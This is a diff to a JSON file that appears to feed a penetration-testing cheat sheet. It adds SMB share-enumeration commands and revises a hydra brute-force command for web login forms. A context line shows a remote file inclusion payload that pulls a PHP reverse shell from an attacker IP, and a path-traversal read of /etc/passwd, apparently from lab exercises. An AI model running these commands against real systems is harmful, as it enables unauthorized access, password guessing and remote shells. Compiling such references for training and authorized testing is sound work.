@@ -12,9 +12,19 @@
             "description": "Similar to the basic nmap scan except it will check all ports, the '-oA' will save it in the three main file formats, you don't have to include this."
         },
         {
-            "command": "smbmap -H [IP] -d [domain]",
+            "command": "smbmap -H [IP]<br>or<br> smbmap -H [IP] -d [domain]",
             "section": "Recon",
-            "description": "Enumerate available SMB shares. For the IP address, you don't have to indicate the port, just put the IP address."
+            "description": "Enumerate available SMB shares, default port is 139. For the IP address, you don't have to indicate the port, just put the IP address. If you get 'Authentication Error on IP' try adding a fake user flag of '-u notarealuser'"
+        },
+        {
+            "command": "nmap --script smb-enum-shares.nse -p139,445 [IP]",
+            "section": "Recon",
+            "description": "Enumerate available SMB shares on port 139 and 445 using nmap scripts."
+        },
+        {
+            "command": "smbclient -L [IP]",
+            "section": "Recon",
+            "description": "Enumerate available SMB shares using smbclient."
         },
         {
             "command": "dirb [url] [wordlist]",
@@ -61,9 +71,9 @@
     "init":
     [
         {
-            "command": "hydra -l [username] -P [password list] [ip address (only ip)] http-post-form \"[login page uri]:__VIEWSTATE=[full viewstate from Burp Suite]:[string that displays failed attempt]\"",
+            "command": "hydra -l [username] -P [password list] [ip address (only ip)] http-post-form \"[login page uri]:[Request Body]:[string that displays failed attempt]\"",
             "section": "Initial Access",
-            "description": "Using hydra to brute force a login web page. Use BurpSuite and test a random user/pass combination to get the VIEWSTATE/body. Within the VIEWSTATE portion, you should see where you tested a login combination. Replace the username you guessed with ^USER^ and the password you guessed with ^PASS^."
+            "description": "Using hydra to brute force a login web page. Use BurpSuite and test a random user/pass combination to request body. Within the request portion, you should see where you tested a login combination. Replace the username you guessed with ^USER^ and the password you guessed with ^PASS^."
         },
         {
             "command": "Remote/local file inclusion<br><br>RFI example: https://10.10.190.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.22.171/php-reverse-shell.php<br><br>LFI example: https://10.10.190.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd",
